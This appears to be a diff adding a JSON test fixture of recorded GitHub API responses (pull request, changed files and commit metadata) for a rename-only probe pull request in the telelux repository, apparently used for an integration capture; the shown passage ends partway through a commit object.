@@ -1,0 +1,1419 @@
+[
+  {
+    "method": "getPull",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "pull_number": 77
+    },
+    "result": {
+      "url": "https://api.github.com/repos/thekevinscott/telelux/pulls/77",
+      "id": 4637676507,
+      "node_id": "PR_kwDOUcV3s88AAAABFG1T2w",
+      "html_url": "https://github.com/thekevinscott/telelux/pull/77",
+      "diff_url": "https://github.com/thekevinscott/telelux/pull/77.diff",
+      "patch_url": "https://github.com/thekevinscott/telelux/pull/77.patch",
+      "issue_url": "https://api.github.com/repos/thekevinscott/telelux/issues/77",
+      "number": 77,
+      "state": "open",
+      "locked": false,
+      "title": "Capture probe: rename matched on its previous path",
+      "user": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "body": "Throwaway probe for a willfire integration capture (case D11): a rename whose previous path matches node-telelux.yml's paths filter. Will be closed unmerged once checks conclude.",
+      "created_at": "2026-09-25T11:57:26Z",
+      "updated_at": "2026-09-25T11:57:51Z",
+      "closed_at": null,
+      "merged_at": null,
+      "merge_commit_sha": "25d76b93a922325f68476b74076a99a260274497",
+      "assignees": [],
+      "requested_reviewers": [],
+      "requested_teams": [],
+      "labels": [],
+      "milestone": null,
+      "draft": false,
+      "commits_url": "https://api.github.com/repos/thekevinscott/telelux/pulls/77/commits",
+      "review_comments_url": "https://api.github.com/repos/thekevinscott/telelux/pulls/77/comments",
+      "review_comment_url": "https://api.github.com/repos/thekevinscott/telelux/pulls/comments{/number}",
+      "comments_url": "https://api.github.com/repos/thekevinscott/telelux/issues/77/comments",
+      "statuses_url": "https://api.github.com/repos/thekevinscott/telelux/statuses/d885a8ddd115b809344ad0909f06da81ff3e4311",
+      "head": {
+        "label": "thekevinscott:probe/d11-rename-previous-path",
+        "ref": "probe/d11-rename-previous-path",
+        "sha": "d885a8ddd115b809344ad0909f06da81ff3e4311",
+        "user": {
+          "login": "thekevinscott",
+          "id": 151596,
+          "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/thekevinscott",
+          "html_url": "https://github.com/thekevinscott",
+          "followers_url": "https://api.github.com/users/thekevinscott/followers",
+          "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+          "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+          "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+          "repos_url": "https://api.github.com/users/thekevinscott/repos",
+          "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "repo": {
+          "id": 1371895731,
+          "node_id": "R_kgDOUcV3sw",
+          "name": "telelux",
+          "full_name": "thekevinscott/telelux",
+          "private": false,
+          "owner": {
+            "login": "thekevinscott",
+            "id": 151596,
+            "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+            "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/thekevinscott",
+            "html_url": "https://github.com/thekevinscott",
+            "followers_url": "https://api.github.com/users/thekevinscott/followers",
+            "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+            "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+            "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+            "repos_url": "https://api.github.com/users/thekevinscott/repos",
+            "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "html_url": "https://github.com/thekevinscott/telelux",
+          "description": null,
+          "fork": false,
+          "url": "https://api.github.com/repos/thekevinscott/telelux",
+          "forks_url": "https://api.github.com/repos/thekevinscott/telelux/forks",
+          "keys_url": "https://api.github.com/repos/thekevinscott/telelux/keys{/key_id}",
+          "collaborators_url": "https://api.github.com/repos/thekevinscott/telelux/collaborators{/collaborator}",
+          "teams_url": "https://api.github.com/repos/thekevinscott/telelux/teams",
+          "hooks_url": "https://api.github.com/repos/thekevinscott/telelux/hooks",
+          "issue_events_url": "https://api.github.com/repos/thekevinscott/telelux/issues/events{/number}",
+          "events_url": "https://api.github.com/repos/thekevinscott/telelux/events",
+          "assignees_url": "https://api.github.com/repos/thekevinscott/telelux/assignees{/user}",
+          "branches_url": "https://api.github.com/repos/thekevinscott/telelux/branches{/branch}",
+          "tags_url": "https://api.github.com/repos/thekevinscott/telelux/tags",
+          "blobs_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs{/sha}",
+          "git_tags_url": "https://api.github.com/repos/thekevinscott/telelux/git/tags{/sha}",
+          "git_refs_url": "https://api.github.com/repos/thekevinscott/telelux/git/refs{/sha}",
+          "trees_url": "https://api.github.com/repos/thekevinscott/telelux/git/trees{/sha}",
+          "statuses_url": "https://api.github.com/repos/thekevinscott/telelux/statuses/{sha}",
+          "languages_url": "https://api.github.com/repos/thekevinscott/telelux/languages",
+          "stargazers_url": "https://api.github.com/repos/thekevinscott/telelux/stargazers",
+          "contributors_url": "https://api.github.com/repos/thekevinscott/telelux/contributors",
+          "subscribers_url": "https://api.github.com/repos/thekevinscott/telelux/subscribers",
+          "subscription_url": "https://api.github.com/repos/thekevinscott/telelux/subscription",
+          "commits_url": "https://api.github.com/repos/thekevinscott/telelux/commits{/sha}",
+          "git_commits_url": "https://api.github.com/repos/thekevinscott/telelux/git/commits{/sha}",
+          "comments_url": "https://api.github.com/repos/thekevinscott/telelux/comments{/number}",
+          "issue_comment_url": "https://api.github.com/repos/thekevinscott/telelux/issues/comments{/number}",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/{+path}",
+          "compare_url": "https://api.github.com/repos/thekevinscott/telelux/compare/{base}...{head}",
+          "merges_url": "https://api.github.com/repos/thekevinscott/telelux/merges",
+          "archive_url": "https://api.github.com/repos/thekevinscott/telelux/{archive_format}{/ref}",
+          "downloads_url": "https://api.github.com/repos/thekevinscott/telelux/downloads",
+          "issues_url": "https://api.github.com/repos/thekevinscott/telelux/issues{/number}",
+          "pulls_url": "https://api.github.com/repos/thekevinscott/telelux/pulls{/number}",
+          "milestones_url": "https://api.github.com/repos/thekevinscott/telelux/milestones{/number}",
+          "notifications_url": "https://api.github.com/repos/thekevinscott/telelux/notifications{?since,all,participating}",
+          "labels_url": "https://api.github.com/repos/thekevinscott/telelux/labels{/name}",
+          "releases_url": "https://api.github.com/repos/thekevinscott/telelux/releases{/id}",
+          "deployments_url": "https://api.github.com/repos/thekevinscott/telelux/deployments",
+          "created_at": "2026-09-15T17:50:56Z",
+          "updated_at": "2026-09-25T11:39:16Z",
+          "pushed_at": "2026-09-25T11:57:14Z",
+          "git_url": "git://github.com/thekevinscott/telelux.git",
+          "ssh_url": "git@github.com:thekevinscott/telelux.git",
+          "clone_url": "https://github.com/thekevinscott/telelux.git",
+          "svn_url": "https://github.com/thekevinscott/telelux",
+          "homepage": "https://telelux.netlify.app",
+          "size": 533,
+          "stargazers_count": 0,
+          "watchers_count": 0,
+          "language": "TypeScript",
+          "has_issues": true,
+          "has_projects": true,
+          "has_downloads": false,
+          "has_wiki": false,
+          "has_pages": false,
+          "has_discussions": false,
+          "forks_count": 0,
+          "mirror_url": null,
+          "archived": false,
+          "disabled": false,
+          "open_issues_count": 33,
+          "license": {
+            "key": "mit",
+            "name": "MIT License",
+            "spdx_id": "MIT",
+            "url": "https://api.github.com/licenses/mit",
+            "node_id": "MDc6TGljZW5zZTEz"
+          },
+          "allow_forking": true,
+          "is_template": false,
+          "web_commit_signoff_required": false,
+          "has_pull_requests": true,
+          "pull_request_creation_policy": "all",
+          "topics": [],
+          "visibility": "public",
+          "forks": 0,
+          "open_issues": 33,
+          "watchers": 0,
+          "default_branch": "main"
+        }
+      },
+      "base": {
+        "label": "thekevinscott:main",
+        "ref": "main",
+        "sha": "bfc749a2b01f19cddac06c03d347b9663ebef86b",
+        "user": {
+          "login": "thekevinscott",
+          "id": 151596,
+          "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/thekevinscott",
+          "html_url": "https://github.com/thekevinscott",
+          "followers_url": "https://api.github.com/users/thekevinscott/followers",
+          "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+          "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+          "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+          "repos_url": "https://api.github.com/users/thekevinscott/repos",
+          "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "repo": {
+          "id": 1371895731,
+          "node_id": "R_kgDOUcV3sw",
+          "name": "telelux",
+          "full_name": "thekevinscott/telelux",
+          "private": false,
+          "owner": {
+            "login": "thekevinscott",
+            "id": 151596,
+            "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+            "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/thekevinscott",
+            "html_url": "https://github.com/thekevinscott",
+            "followers_url": "https://api.github.com/users/thekevinscott/followers",
+            "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+            "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+            "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+            "repos_url": "https://api.github.com/users/thekevinscott/repos",
+            "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "html_url": "https://github.com/thekevinscott/telelux",
+          "description": null,
+          "fork": false,
+          "url": "https://api.github.com/repos/thekevinscott/telelux",
+          "forks_url": "https://api.github.com/repos/thekevinscott/telelux/forks",
+          "keys_url": "https://api.github.com/repos/thekevinscott/telelux/keys{/key_id}",
+          "collaborators_url": "https://api.github.com/repos/thekevinscott/telelux/collaborators{/collaborator}",
+          "teams_url": "https://api.github.com/repos/thekevinscott/telelux/teams",
+          "hooks_url": "https://api.github.com/repos/thekevinscott/telelux/hooks",
+          "issue_events_url": "https://api.github.com/repos/thekevinscott/telelux/issues/events{/number}",
+          "events_url": "https://api.github.com/repos/thekevinscott/telelux/events",
+          "assignees_url": "https://api.github.com/repos/thekevinscott/telelux/assignees{/user}",
+          "branches_url": "https://api.github.com/repos/thekevinscott/telelux/branches{/branch}",
+          "tags_url": "https://api.github.com/repos/thekevinscott/telelux/tags",
+          "blobs_url": "https://api.github.com/repos/thekevinscott/telelux/git/blobs{/sha}",
+          "git_tags_url": "https://api.github.com/repos/thekevinscott/telelux/git/tags{/sha}",
+          "git_refs_url": "https://api.github.com/repos/thekevinscott/telelux/git/refs{/sha}",
+          "trees_url": "https://api.github.com/repos/thekevinscott/telelux/git/trees{/sha}",
+          "statuses_url": "https://api.github.com/repos/thekevinscott/telelux/statuses/{sha}",
+          "languages_url": "https://api.github.com/repos/thekevinscott/telelux/languages",
+          "stargazers_url": "https://api.github.com/repos/thekevinscott/telelux/stargazers",
+          "contributors_url": "https://api.github.com/repos/thekevinscott/telelux/contributors",
+          "subscribers_url": "https://api.github.com/repos/thekevinscott/telelux/subscribers",
+          "subscription_url": "https://api.github.com/repos/thekevinscott/telelux/subscription",
+          "commits_url": "https://api.github.com/repos/thekevinscott/telelux/commits{/sha}",
+          "git_commits_url": "https://api.github.com/repos/thekevinscott/telelux/git/commits{/sha}",
+          "comments_url": "https://api.github.com/repos/thekevinscott/telelux/comments{/number}",
+          "issue_comment_url": "https://api.github.com/repos/thekevinscott/telelux/issues/comments{/number}",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/{+path}",
+          "compare_url": "https://api.github.com/repos/thekevinscott/telelux/compare/{base}...{head}",
+          "merges_url": "https://api.github.com/repos/thekevinscott/telelux/merges",
+          "archive_url": "https://api.github.com/repos/thekevinscott/telelux/{archive_format}{/ref}",
+          "downloads_url": "https://api.github.com/repos/thekevinscott/telelux/downloads",
+          "issues_url": "https://api.github.com/repos/thekevinscott/telelux/issues{/number}",
+          "pulls_url": "https://api.github.com/repos/thekevinscott/telelux/pulls{/number}",
+          "milestones_url": "https://api.github.com/repos/thekevinscott/telelux/milestones{/number}",
+          "notifications_url": "https://api.github.com/repos/thekevinscott/telelux/notifications{?since,all,participating}",
+          "labels_url": "https://api.github.com/repos/thekevinscott/telelux/labels{/name}",
+          "releases_url": "https://api.github.com/repos/thekevinscott/telelux/releases{/id}",
+          "deployments_url": "https://api.github.com/repos/thekevinscott/telelux/deployments",
+          "created_at": "2026-09-15T17:50:56Z",
+          "updated_at": "2026-09-25T11:39:16Z",
+          "pushed_at": "2026-09-25T11:57:14Z",
+          "git_url": "git://github.com/thekevinscott/telelux.git",
+          "ssh_url": "git@github.com:thekevinscott/telelux.git",
+          "clone_url": "https://github.com/thekevinscott/telelux.git",
+          "svn_url": "https://github.com/thekevinscott/telelux",
+          "homepage": "https://telelux.netlify.app",
+          "size": 533,
+          "stargazers_count": 0,
+          "watchers_count": 0,
+          "language": "TypeScript",
+          "has_issues": true,
+          "has_projects": true,
+          "has_downloads": false,
+          "has_wiki": false,
+          "has_pages": false,
+          "has_discussions": false,
+          "forks_count": 0,
+          "mirror_url": null,
+          "archived": false,
+          "disabled": false,
+          "open_issues_count": 33,
+          "license": {
+            "key": "mit",
+            "name": "MIT License",
+            "spdx_id": "MIT",
+            "url": "https://api.github.com/licenses/mit",
+            "node_id": "MDc6TGljZW5zZTEz"
+          },
+          "allow_forking": true,
+          "is_template": false,
+          "web_commit_signoff_required": false,
+          "has_pull_requests": true,
+          "pull_request_creation_policy": "all",
+          "topics": [],
+          "visibility": "public",
+          "forks": 0,
+          "open_issues": 33,
+          "watchers": 0,
+          "default_branch": "main"
+        }
+      },
+      "_links": {
+        "self": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/pulls/77"
+        },
+        "html": {
+          "href": "https://github.com/thekevinscott/telelux/pull/77"
+        },
+        "issue": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/issues/77"
+        },
+        "comments": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/issues/77/comments"
+        },
+        "review_comments": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/pulls/77/comments"
+        },
+        "review_comment": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/pulls/comments{/number}"
+        },
+        "commits": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/pulls/77/commits"
+        },
+        "statuses": {
+          "href": "https://api.github.com/repos/thekevinscott/telelux/statuses/d885a8ddd115b809344ad0909f06da81ff3e4311"
+        }
+      },
+      "author_association": "COLLABORATOR",
+      "auto_merge": null,
+      "assignee": null,
+      "active_lock_reason": null,
+      "merged": false,
+      "mergeable": true,
+      "rebaseable": true,
+      "mergeable_state": "clean",
+      "merged_by": null,
+      "comments": 1,
+      "review_comments": 0,
+      "maintainer_can_modify": false,
+      "commits": 1,
+      "additions": 0,
+      "deletions": 0,
+      "changed_files": 1
+    }
+  },
+  {
+    "method": "listPullFiles",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "pull_number": 77
+    },
+    "result": [
+      {
+        "sha": "4afb36adce42fb2613f90decc77058219c778690",
+        "filename": "archive/node-telelux-CHANGELOG.md",
+        "status": "renamed",
+        "additions": 0,
+        "deletions": 0,
+        "changes": 0,
+        "blob_url": "https://github.com/thekevinscott/telelux/blob/d885a8ddd115b809344ad0909f06da81ff3e4311/archive%2Fnode-telelux-CHANGELOG.md",
+        "raw_url": "https://github.com/thekevinscott/telelux/raw/d885a8ddd115b809344ad0909f06da81ff3e4311/archive%2Fnode-telelux-CHANGELOG.md",
+        "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/archive%2Fnode-telelux-CHANGELOG.md?ref=d885a8ddd115b809344ad0909f06da81ff3e4311",
+        "previous_filename": "packages/node/telelux/CHANGELOG.md"
+      }
+    ]
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "ref": "25d76b93a922325f68476b74076a99a260274497"
+    },
+    "result": {
+      "sha": "25d76b93a922325f68476b74076a99a260274497",
+      "node_id": "C_kwDOUcV3s9oAKDI1ZDc2YjkzYTkyMjMyNWY2ODQ3NmI3NDA3NmE5OWEyNjAyNzQ0OTc",
+      "commit": {
+        "author": {
+          "name": "thekevinbot",
+          "email": "248217931+thekevinbot@users.noreply.github.com",
+          "date": "2026-09-25T11:57:27Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-25T11:57:27Z"
+        },
+        "message": "Merge d885a8ddd115b809344ad0909f06da81ff3e4311 into bfc749a2b01f19cddac06c03d347b9663ebef86b",
+        "tree": {
+          "sha": "c383a0119ab23b9c30aabd4d117d5069f89308d5",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/git/trees/c383a0119ab23b9c30aabd4d117d5069f89308d5"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/telelux/git/commits/25d76b93a922325f68476b74076a99a260274497",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtmGnCRC1aQ7uu5UhlAAATbYQAGmgraKPuLNyqU7gd80RY9Dw\nfebMaOkLlvF3p5VGBIck+dqqUhqGw+HmLLUht8kvomwi1Vtg5ZLzIFKIe9A1FiXQ\npoMvO2T2oL5Wfg89wV0vNy7OSqXjRdFbYY2STmVLKtyImssChl6K7Cnd5uPkgOKb\ngdyEcd5ZnoYG44L0iAckSXCj/3HPxOlKRH+bI7ywKmxORTf03gkszFxx0VU5oMKz\nhFmZlgVXaQKtbAjA71uOmSYleFIXm83sF6VDDC4/jVNTwsy9g98FUVl2XB+9kK6l\n7LQtFQiYtS2LSDRnpOR5/LPWgfhVLg2FJA/c5FMb3o0HcLVLRNNs1T+e6scVcv9S\nO58vuMbwIzbYXsrZfKotRp5HvC4srBL3ZXhsOkSkRH6YmmcWrAw1GRqeeACdZUOm\nvaf7dpl3f37DRtwiDFZy9PS0RS+uvjvg1M2U/M5LgLGu/coMG5WqRxXfgFcWVs5+\n8pX02mPQ5XiEYGVg4eCLDGpZrWXGJ59i49XbxtIgscvaLSRqdvr5DPI4ZOqVPjFR\nePH40++uWlf8LXgcxJyR0/PcvrD0gVOPy2MXP86OX0ph1Ia2KE0mNoc+2sG5KZXO\n4WpQRzR6EoBc8tjtJV41jv8wIhWwiGi1S8VyRerdDUCUBhcd2Fe8CnN6RKSpEPOn\nZbKtAknwPLPagv7HK/Qw\n=khzt\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree c383a0119ab23b9c30aabd4d117d5069f89308d5\nparent bfc749a2b01f19cddac06c03d347b9663ebef86b\nparent d885a8ddd115b809344ad0909f06da81ff3e4311\nauthor thekevinbot <248217931+thekevinbot@users.noreply.github.com> 1790337447 -0400\ncommitter GitHub <noreply@github.com> 1790337447 -0400\n\nMerge d885a8ddd115b809344ad0909f06da81ff3e4311 into bfc749a2b01f19cddac06c03d347b9663ebef86b\n",
+          "verified_at": "2026-09-25T11:57:27Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/telelux/commits/25d76b93a922325f68476b74076a99a260274497",
+      "html_url": "https://github.com/thekevinscott/telelux/commit/25d76b93a922325f68476b74076a99a260274497",
+      "comments_url": "https://api.github.com/repos/thekevinscott/telelux/commits/25d76b93a922325f68476b74076a99a260274497/comments",
+      "author": {
+        "login": "thekevinbot",
+        "id": 248217931,
+        "node_id": "U_kgDODsuBSw",
+        "avatar_url": "https://avatars.githubusercontent.com/u/248217931?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinbot",
+        "html_url": "https://github.com/thekevinbot",
+        "followers_url": "https://api.github.com/users/thekevinbot/followers",
+        "following_url": "https://api.github.com/users/thekevinbot/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinbot/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinbot/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinbot/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinbot/orgs",
+        "repos_url": "https://api.github.com/users/thekevinbot/repos",
+        "events_url": "https://api.github.com/users/thekevinbot/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinbot/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
+        "gists_url": "https://api.github.com/users/web-flow/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/web-flow/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/web-flow/subscriptions",
+        "organizations_url": "https://api.github.com/users/web-flow/orgs",
+        "repos_url": "https://api.github.com/users/web-flow/repos",
+        "events_url": "https://api.github.com/users/web-flow/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/web-flow/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "parents": [
+        {
+          "sha": "bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/commits/bfc749a2b01f19cddac06c03d347b9663ebef86b",
+          "html_url": "https://github.com/thekevinscott/telelux/commit/bfc749a2b01f19cddac06c03d347b9663ebef86b"
+        },
+        {
+          "sha": "d885a8ddd115b809344ad0909f06da81ff3e4311",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/commits/d885a8ddd115b809344ad0909f06da81ff3e4311",
+          "html_url": "https://github.com/thekevinscott/telelux/commit/d885a8ddd115b809344ad0909f06da81ff3e4311"
+        }
+      ],
+      "stats": {
+        "total": 0,
+        "additions": 0,
+        "deletions": 0
+      },
+      "files": [
+        {
+          "sha": "4afb36adce42fb2613f90decc77058219c778690",
+          "filename": "archive/node-telelux-CHANGELOG.md",
+          "status": "renamed",
+          "additions": 0,
+          "deletions": 0,
+          "changes": 0,
+          "blob_url": "https://github.com/thekevinscott/telelux/blob/25d76b93a922325f68476b74076a99a260274497/archive%2Fnode-telelux-CHANGELOG.md",
+          "raw_url": "https://github.com/thekevinscott/telelux/raw/25d76b93a922325f68476b74076a99a260274497/archive%2Fnode-telelux-CHANGELOG.md",
+          "contents_url": "https://api.github.com/repos/thekevinscott/telelux/contents/archive%2Fnode-telelux-CHANGELOG.md?ref=25d76b93a922325f68476b74076a99a260274497",
+          "previous_filename": "packages/node/telelux/CHANGELOG.md"
+        }
+      ]
+    }
+  },
+  {
+    "method": "getCommit",
+    "params": {
+      "owner": "thekevinscott",
+      "repo": "telelux",
+      "ref": "main"
+    },
+    "result": {
+      "sha": "bfc749a2b01f19cddac06c03d347b9663ebef86b",
+      "node_id": "C_kwDOUcV3s9oAKGJmYzc0OWEyYjAxZjE5Y2RkYWMwNmMwM2QzNDdiOTY2M2ViZWY4NmI",
+      "commit": {
+        "author": {
+          "name": "Kevin Scott",
+          "email": "151596+thekevinscott@users.noreply.github.com",
+          "date": "2026-09-25T11:39:11Z"
+        },
+        "committer": {
+          "name": "GitHub",
+          "email": "noreply@github.com",
+          "date": "2026-09-25T11:39:11Z"
+        },
+        "message": "Merge pull request #76 from thekevinscott/input-contract\n\nAccept docent's transcript shape through the transcript property",
+        "tree": {
+          "sha": "1e118a967ef431f26b72a5ec596c82ff0e7c9425",
+          "url": "https://api.github.com/repos/thekevinscott/telelux/git/trees/1e118a967ef431f26b72a5ec596c82ff0e7c9425"
+        },
+        "url": "https://api.github.com/repos/thekevinscott/telelux/git/commits/bfc749a2b01f19cddac06c03d347b9663ebef86b",
+        "comment_count": 0,
+        "verification": {
+          "verified": true,
+          "reason": "valid",
+          "signature": "-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqtl1fCRC1aQ7uu5UhlAAAo0oQAI3OdDzkmaEhSLYkex0kGoIc\n+gov8OvY321TXA6JnKOcOmpTHufCm8+DlOr0rY9Cv1WvLl9o4EFZzY8itmRpf8B7\njD73cBzz1KO95rKZf+pjIIIJz3PTZuioykyBtHbTfr6b587ND/YpaUhtlIS2zTkY\nl0bBddyIPvk8DwIegUhlUPD4SGs8C4XoMTFJCXJxGrgDkSG1Y5OcxI6JNIr9VM0i\neHXvRixev4KeG//2WIL0jJvnihwWwJP+jKkl5gr2OX4hQaeteO/ha05RV9/jwwsp\nISeUAOJi4c6DfYNRqB1SuROtfrDMVxD3tQbQM+05G3Ri93D9VEVFPel7yFrSoD6L\ntQcc+H5ump/lQMwn854pMb2YRgh65fS5aELbqypy0yw393SATsRcSwl/INGr1nsV\nRBaQ9KqOhjo2ssVcLyRbFkGx7bPUjuhLFn7S00bXWe29srH7setxspiFCkFX85om\n+XiS1DtHt+tJlVPOjS8/N2bOa4BF2TewYex0YLuWRstl90a4ImTiolaXzjF0QHUd\n/TsprV+hTCRSBirDHUSEzxduRRI2uxqXODEFP2iCNuxiNGWrwYTLHFA4+1eueNvl\njM1BIG0rhuUlNGAAZWzWYqgzMyRMm/TqY9cJn2vQPp5EHUokUqDtyeHCXFpOtkZs\n9SQG4Ebn2V/pnQPVJIWC\n=kf0M\n-----END PGP SIGNATURE-----\n",
+          "payload": "tree 1e118a967ef431f26b72a5ec596c82ff0e7c9425\nparent f378f8949ba8754af47f79f5aed48c556407452e\nparent 67d26e1c5387bc27c13278093a7a78fe9cb9f10a\nauthor Kevin Scott <151596+thekevinscott@users.noreply.github.com> 1790336351 -0400\ncommitter GitHub <noreply@github.com> 1790336351 -0400\n\nMerge pull request #76 from thekevinscott/input-contract\n\nAccept docent's transcript shape through the transcript property",
+          "verified_at": "2026-09-25T11:39:11Z"
+        }
+      },
+      "url": "https://api.github.com/repos/thekevinscott/telelux/commits/bfc749a2b01f19cddac06c03d347b9663ebef86b",
+      "html_url": "https://github.com/thekevinscott/telelux/commit/bfc749a2b01f19cddac06c03d347b9663ebef86b",
+      "comments_url": "https://api.github.com/repos/thekevinscott/telelux/commits/bfc749a2b01f19cddac06c03d347b9663ebef86b/comments",
+      "author": {
+        "login": "thekevinscott",
+        "id": 151596,
+        "node_id": "MDQ6VXNlcjE1MTU5Ng==",
+        "avatar_url": "https://avatars.githubusercontent.com/u/151596?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/thekevinscott",
+        "html_url": "https://github.com/thekevinscott",
+        "followers_url": "https://api.github.com/users/thekevinscott/followers",
+        "following_url": "https://api.github.com/users/thekevinscott/following{/other_user}",
+        "gists_url": "https://api.github.com/users/thekevinscott/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/thekevinscott/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/thekevinscott/subscriptions",
+        "organizations_url": "https://api.github.com/users/thekevinscott/orgs",
+        "repos_url": "https://api.github.com/users/thekevinscott/repos",
+        "events_url": "https://api.github.com/users/thekevinscott/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/thekevinscott/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "committer": {
+        "login": "web-flow",
+        "id": 19864447,
+        "node_id": "MDQ6VXNlcjE5ODY0NDQ3",
+        "avatar_url": "https://avatars.githubusercontent.com/u/19864447?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/web-flow",
+        "html_url": "https://github.com/web-flow",
+        "followers_url": "https://api.github.com/users/web-flow/followers",
+        "following_url": "https://api.github.com/users/web-flow/following{/other_user}",
